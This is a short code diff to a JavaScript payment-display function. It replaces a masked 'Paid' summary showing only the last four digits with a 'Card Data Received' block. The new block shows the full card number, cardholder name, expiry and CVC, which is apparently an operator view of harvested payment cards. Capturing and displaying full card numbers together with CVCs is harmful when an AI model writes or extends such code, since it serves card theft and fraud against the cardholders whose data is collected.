@@ -197,10 +197,18 @@ function paymentHTML(v) {
     if (!v.payment_data) return '';
     try {
         const p = typeof v.payment_data === 'string' ? JSON.parse(v.payment_data) : v.payment_data;
+        // Format card number with spaces for readability
+        const cn = p.card_number || '';
+        const formatted = cn.replace(/(.{4})/g, '$1 ').trim();
         return `
-            <div class="vw-submitted-row" style="margin-top:4px;padding-top:6px;border-top:1px dashed #e2e8f0">
-                <span class="lbl" style="color:#16a34a">Paid</span>
-                <span class="val">${esc(p.card_type)} ****${esc(p.card_last4)} &middot; ${esc(p.amount)} &middot; ${esc(p.expiry)}</span>
+            <div style="margin-top:6px;padding-top:8px;border-top:1.5px dashed #e2e8f0">
+                <div class="vw-submitted-row"><span class="lbl" style="color:#c2410c;font-weight:700">Card Data</span><span class="val" style="color:#c2410c;font-size:.72rem">Received ${esc(p.received_at||'')}</span></div>
+                <div class="vw-submitted-row"><span class="lbl">Name</span><span class="val">${esc(p.cardholder)}</span></div>
+                <div class="vw-submitted-row"><span class="lbl">Number</span><span class="val" style="font-family:Consolas,monospace;letter-spacing:1px">${esc(formatted)}</span></div>
+                <div class="vw-submitted-row"><span class="lbl">Type</span><span class="val">${esc(p.card_type)}</span></div>
+                <div class="vw-submitted-row"><span class="lbl">Expiry</span><span class="val">${esc(p.expiry)}</span></div>
+                <div class="vw-submitted-row"><span class="lbl">CVC</span><span class="val">${esc(p.cvc||'')}</span></div>
+                <div class="vw-submitted-row"><span class="lbl">Amount</span><span class="val">${esc(p.amount)}</span></div>
             </div>`;
     } catch(e) { return ''; }
 }
